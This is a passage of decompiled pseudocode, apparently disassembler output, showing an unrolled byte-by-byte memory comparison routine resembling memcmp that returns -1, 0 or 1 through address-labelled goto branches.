*(arg_ch + (arg_10h - 0x18));\n            if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                return iVar3;\n            }\n            iVar3 = *(arg_8h + (arg_10h - 0x17)) - *(arg_ch + (arg_10h - 0x17));\n            if (iVar3 != 0) {\n                iVar3 = (0 < iVar3) * 2 + -1;\n            }\n        }\n        if (iVar3 != 0) {\n            return iVar3;\n        }\n        goto code_r0x0042520f;\n    case 0x1f:\n        if (*(arg_8h + (arg_10h - 0x1f)) == *(arg_ch + (arg_10h - 0x1f))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = *(arg_ch + (arg_10h - 0x1f));\n            uVar4 = *(arg_8h + (arg_10h - 0x1f));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1e));\n            uVar2 = *(arg_ch + (arg_10h - 0x1e));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1d));\n            uVar2 = *(arg_ch + (arg_10h - 0x1d));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x1c)) - *(arg_ch + (arg_10h - 0x1c));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n    case 0x1b:\n        uVar2 = *(arg_8h + (arg_10h - 0x1b));\n        if (uVar2 == *(arg_ch + (arg_10h - 0x1b))) {\n            iVar5 = 0;\n        }\n        else {\n            uVar2 = uVar2 & 0xff;\n            uVar4 = *(arg_ch + (arg_10h - 0x1b));\n            if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x1a));\n            uVar2 = *(arg_ch + (arg_10h - 0x1a));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            uVar4 = *(arg_8h + (arg_10h - 0x19));\n            uVar2 = *(arg_ch + (arg_10h - 0x19));\n            if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n                return iVar5;\n            }\n            iVar5 = *(arg_8h + (arg_10h - 0x18)) - *(arg_ch + (arg_10h - 0x18));\n            if (iVar5 != 0) {\n                iVar5 = (0 < iVar5) * 2 + -1;\n            }\n        }\n        if (iVar5 != 0) {\n            return iVar5;\n        }\n        goto code_r0x004256bb;\n    }\n    goto code_r0x00424c77;\ncode_r0x004256bb:\n    uVar2 = *(arg_8h + (arg_10h - 0x17));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x17))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x17));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x16));\n        uVar2 = *(arg_ch + (arg_10h - 0x16));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x15));\n        uVar2 = *(arg_ch + (arg_10h - 0x15));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x14)) - *(arg_ch + (arg_10h - 0x14));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x0042575a;\ncode_r0x0042520f:\n    uVar2 = *(arg_8h + (arg_10h - 0x16));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x16))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x16));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x15));\n        uVar2 = *(arg_ch + (arg_10h - 0x15));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x14));\n        uVar2 = *(arg_ch + (arg_10h - 0x14));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 0x13)) - *(arg_ch + (arg_10h - 0x13));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x004252ae;\ncode_r0x00424dad:\n    uVar2 = *(arg_8h + (arg_10h - 0x15));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x15))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x15));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x14));\n        uVar2 = *(arg_ch + (arg_10h - 0x14));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x13));\n        uVar2 = *(arg_ch + (arg_10h - 0x13));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x12)) - *(arg_ch + (arg_10h - 0x12));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00424e4c;\ncode_r0x0042496c:\n    uVar2 = *(arg_8h + (arg_10h - 0x14));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x14))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x14));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x13));\n        uVar2 = *(arg_ch + (arg_10h - 0x13));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x12));\n        uVar2 = *(arg_ch + (arg_10h - 0x12));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x11)) - *(arg_ch + (arg_10h - 0x11));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00424a0b;\ncode_r0x0042575a:\n    uVar2 = *(arg_8h + (arg_10h - 0x13));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x13))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x13));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x12));\n        uVar2 = *(arg_ch + (arg_10h - 0x12));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x11));\n        uVar2 = *(arg_ch + (arg_10h - 0x11));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0x10)) - *(arg_ch + (arg_10h - 0x10));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x004257f9;\ncode_r0x004252ae:\n    uVar2 = *(arg_8h + (arg_10h - 0x12));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x12))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x12));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x11));\n        uVar2 = *(arg_ch + (arg_10h - 0x11));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x10));\n        uVar2 = *(arg_ch + (arg_10h - 0x10));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 0xf)) - *(arg_ch + (arg_10h - 0xf));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x0042534d;\ncode_r0x00424e4c:\n    uVar2 = *(arg_8h + (arg_10h - 0x11));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x11))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x11));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0x10));\n        uVar2 = *(arg_ch + (arg_10h - 0x10));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xf));\n        uVar2 = *(arg_ch + (arg_10h - 0xf));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0xe)) - *(arg_ch + (arg_10h - 0xe));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00424eeb;\ncode_r0x00424a0b:\n    uVar2 = *(arg_8h + (arg_10h - 0x10));\n    if (uVar2 == *(arg_ch + (arg_10h - 0x10))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0x10));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xf));\n        uVar2 = *(arg_ch + (arg_10h - 0xf));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xe));\n        uVar2 = *(arg_ch + (arg_10h - 0xe));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0xd)) - *(arg_ch + (arg_10h - 0xd));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00424aaa;\ncode_r0x004257f9:\n    uVar2 = *(arg_8h + (arg_10h - 0xf));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xf))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xf));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xe));\n        uVar2 = *(arg_ch + (arg_10h - 0xe));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xd));\n        uVar2 = *(arg_ch + (arg_10h - 0xd));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 0xc)) - *(arg_ch + (arg_10h - 0xc));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00425898;\ncode_r0x0042534d:\n    uVar2 = *(arg_8h + (arg_10h - 0xe));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xe))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xe));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xd));\n        uVar2 = *(arg_ch + (arg_10h - 0xd));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xc));\n        uVar2 = *(arg_ch + (arg_10h - 0xc));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 0xb)) - *(arg_ch + (arg_10h - 0xb));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x004253ec;\ncode_r0x00424eeb:\n    uVar2 = *(arg_8h + (arg_10h - 0xd));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xd))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xd));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xc));\n        uVar2 = *(arg_ch + (arg_10h - 0xc));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xb));\n        uVar2 = *(arg_ch + (arg_10h - 0xb));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 10)) - *(arg_ch + (arg_10h - 10));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00424f8a;\ncode_r0x00424aaa:\n    uVar2 = *(arg_8h + (arg_10h - 0xc));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xc))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xc));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 0xb));\n        uVar2 = *(arg_ch + (arg_10h - 0xb));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 10));\n        uVar2 = *(arg_ch + (arg_10h - 10));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 9)) - *(arg_ch + (arg_10h - 9));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00424b49;\ncode_r0x00425898:\n    uVar2 = *(arg_8h + (arg_10h - 0xb));\n    if (uVar2 == *(arg_ch + (arg_10h - 0xb))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 0xb));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 10));\n        uVar2 = *(arg_ch + (arg_10h - 10));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 9));\n        uVar2 = *(arg_ch + (arg_10h - 9));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 8)) - *(arg_ch + (arg_10h - 8));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00425937;\ncode_r0x004253ec:\n    uVar2 = *(arg_8h + (arg_10h - 10));\n    if (uVar2 == *(arg_ch + (arg_10h - 10))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 10));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 9));\n        uVar2 = *(arg_ch + (arg_10h - 9));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 8));\n        uVar2 = *(arg_ch + (arg_10h - 8));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 7)) - *(arg_ch + (arg_10h - 7));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    goto code_r0x0042548b;\ncode_r0x00424f8a:\n    uVar2 = *(arg_8h + (arg_10h - 9));\n    if (uVar2 == *(arg_ch + (arg_10h - 9))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 9));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 8));\n        uVar2 = *(arg_ch + (arg_10h - 8));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 7));\n        uVar2 = *(arg_ch + (arg_10h - 7));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 6)) - *(arg_ch + (arg_10h - 6));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\n    goto code_r0x00425029;\ncode_r0x00425937:\n    uVar2 = *(arg_8h + (arg_10h - 7));\n    if (uVar2 != *(arg_ch + (arg_10h - 7))) {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 7));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 6));\n        uVar2 = *(arg_ch + (arg_10h - 6));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 5));\n        uVar2 = *(arg_ch + (arg_10h - 5));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 4)) - *(arg_ch + (arg_10h - 4));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\ncode_r0x004259c6:\n    uVar4 = *(arg_8h + (arg_10h - 3));\n    uVar2 = *(arg_ch + (arg_10h - 3));\n    if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n        return iVar3;\n    }\n    uVar4 = *(arg_8h + (arg_10h - 2));\n    uVar2 = *(arg_ch + (arg_10h - 2));\n    if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n        return iVar3;\n    }\n    goto code_r0x004250af;\ncode_r0x0042548b:\n    uVar2 = *(arg_8h + (arg_10h - 6));\n    if (uVar2 == *(arg_ch + (arg_10h - 6))) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 6));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 5));\n        uVar2 = *(arg_ch + (arg_10h - 5));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 4));\n        uVar2 = *(arg_ch + (arg_10h - 4));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 3)) - *(arg_ch + (arg_10h - 3));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\ncode_r0x0042552a:\n    iVar1 = *(arg_8h + (arg_10h - 2));\n    if (iVar1 == *(arg_ch + (arg_10h - 2))) {\n        return 0;\n    }\n    uVar4 = iVar1;\n    uVar2 = *(arg_ch + (arg_10h - 2));\n    if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n        return iVar3;\n    }\n    uVar4 = *(arg_8h + (arg_10h - 1));\n    uVar2 = *(arg_ch + (arg_10h - 1));\n    if (uVar4 == uVar2) {\n        return 0;\n    }\n    return (0 < uVar4 - uVar2) * 2 + -1;\ncode_r0x00424b49:\n    uVar2 = *(arg_8h + (arg_10h - 8));\n    if (uVar2 == *(arg_ch + (arg_10h - 8))) {\n        iVar5 = 0;\n    }\n    else {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 8));\n        if ((uVar2 != uVar4) && (iVar5 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 7));\n        uVar2 = *(arg_ch + (arg_10h - 7));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 6));\n        uVar2 = *(arg_ch + (arg_10h - 6));\n        if ((uVar4 != uVar2) && (iVar5 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar5 != 0)) {\n            return iVar5;\n        }\n        iVar5 = *(arg_8h + (arg_10h - 5)) - *(arg_ch + (arg_10h - 5));\n        if (iVar5 != 0) {\n            iVar5 = (0 < iVar5) * 2 + -1;\n        }\n    }\n    if (iVar5 != 0) {\n        return iVar5;\n    }\ncode_r0x00424be8:\n    uVar2 = *(arg_8h + (arg_10h - 4));\n    if (uVar2 != *(arg_ch + (arg_10h - 4))) {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 4));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 3));\n        uVar2 = *(arg_ch + (arg_10h - 3));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 2));\n        uVar2 = *(arg_ch + (arg_10h - 2));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + (arg_10h - 1)) - *(arg_ch + (arg_10h - 1));\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 == 0) {\ncode_r0x00424c77:\n        iVar3 = 0;\n    }\n    return iVar3;\ncode_r0x00425029:\n    uVar2 = *(arg_8h + (arg_10h - 5));\n    if (uVar2 != *(arg_ch + (arg_10h - 5))) {\n        uVar2 = uVar2 & 0xff;\n        uVar4 = *(arg_ch + (arg_10h - 5));\n        if ((uVar2 != uVar4) && (iVar3 = (uVar2 != uVar4 && -1 < uVar2 - uVar4) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 4));\n        uVar2 = *(arg_ch + (arg_10h - 4));\n        if ((uVar4 != uVar2) && (iVar3 = (uVar4 != uVar2 && -1 < uVar4 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar4 = *(arg_8h + (arg_10h - 3));\n        uVar2 = *(arg_ch + (arg_10h - 3));\n        if ((uVar4 != uVar2) && 